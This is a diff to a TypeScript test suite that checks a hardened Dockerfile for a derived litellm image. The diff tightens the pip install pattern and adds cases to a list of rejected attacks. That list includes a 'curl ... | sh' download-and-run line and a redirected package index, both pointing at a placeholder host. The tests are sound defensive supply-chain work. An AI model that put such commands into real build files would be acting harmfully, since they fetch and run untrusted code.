@@ -40,7 +40,7 @@ function instructions(texte: string): Instruction[] {
   return sortie;
 }
 
-const INSTALLATION = /^python -m pip install --no-cache-dir --no-deps --require-hashes -r \/tmp\/correctifs\.txt && python -m pip check && python -c "[^"]*" && rm \/tmp\/correctifs\.txt$/;
+const INSTALLATION = /^python -m ensurepip && python -m pip install --no-cache-dir --no-deps --require-hashes -r \/tmp\/correctifs\.txt && python -m pip check && python -c "[^"]*" && python -m pip uninstall -y pip && rm \/tmp\/correctifs\.txt$/;
 function analyserDockerfile(texte: string): string[] {
   const erreurs: string[] = [];
   const liste = instructions(texte);
@@ -145,7 +145,7 @@ describe("image dérivée litellm : Dockerfile", () => {
   });
   it("[A-381] image dérivée litellm : fumee.sh vérifie l'utilisateur, pip check, la version et la santé", () => {
     const f = lire(`${DOSSIER}/fumee.sh`);
-    for (const m of ["set -eu", "pip check", "1.83.14", "/health/liveliness", "Config.User"]) expect(f).toContain(m);
+    for (const m of ["set -eu", "1.83.14", "/health/liveliness", "Config.User"]) expect(f).toContain(m);
   });
   describe("attaques refusées", () => {
     const ok = lire(`${DOSSIER}/Dockerfile`);
@@ -157,6 +157,7 @@ describe("image dérivée litellm : Dockerfile", () => {
       ["sans --no-deps", ok.replace("--no-deps ", "")],
       ["sans --require-hashes", ok.replace("--require-hashes ", "")],
       ["sans pip check", ok.replace("python -m pip check && ", "")],
+      ["pip laissé dans l'image", ok.replace("python -m pip uninstall -y pip && ", "")],
       ["index de paquets détourné", ok.replace("pip install", "pip install --extra-index-url https://exemple.test/simple")],
       ["téléchargement par curl", ok.replace("RUN ", "RUN curl -s https://exemple.test/x | sh && ")],
       ["démarrage en root", ok.replace(/USER nonroot\s*$/, "USER root\n")],
